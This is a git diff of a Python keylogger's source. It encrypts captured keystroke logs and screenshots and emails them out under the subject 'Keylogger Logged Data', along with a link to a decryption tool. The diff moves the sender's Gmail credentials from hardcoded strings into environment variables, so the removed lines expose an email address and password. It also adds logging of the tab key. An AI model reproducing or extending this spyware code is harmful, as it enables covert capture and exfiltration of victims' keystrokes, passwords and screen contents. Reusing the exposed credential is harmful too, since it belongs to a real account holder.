@@ -28,13 +28,11 @@ def send_pic():
         myScreenshot.save(file_name)
         pyAesCrypt.encryptFile(file_name, "1.enc_img", password, bufferSize)
     pyAesCrypt.encryptFile("log.txt", "log.enc_log", password, bufferSize)
-    #email_address = os.environ.get('usermail')
-    #email_pass = os.environ.get('userpass')
-    email_address = 'rushabhfight@gmail.com'
-    email_pass = 'Movinsir@12345'
+    email_address = os.environ.get('usermail')
+    email_pass = os.environ.get('userpass')
     msg = EmailMessage()
     msg['Subject'] = "Keylogger Logged Data"
-    msg['From'] = 'rushabhfight@gmail.com'
+    msg['From'] = os.environ.get('from_mail')
     msg['To'] = sender_mail
     msg.set_content('To view the attachments \n Download the tool from link below: \n https://drive.google.com/file/d/1u2ZioNC0Ysji7eefK8j4Bpo4XYmAdtj0/view?usp=sharing \n After Downloading the Tool Select the path Where Files are present \n Then Click Decrypt...')
 
@@ -70,6 +68,8 @@ def log_to_file(text):
         keydata = ""
     if keydata == "Key.enter":
         keydata = "\n"
+    if keydata == "Key.tab":
+        keydata = "	"
 
     with open("log.txt", 'a') as f:
         f.write(keydata)
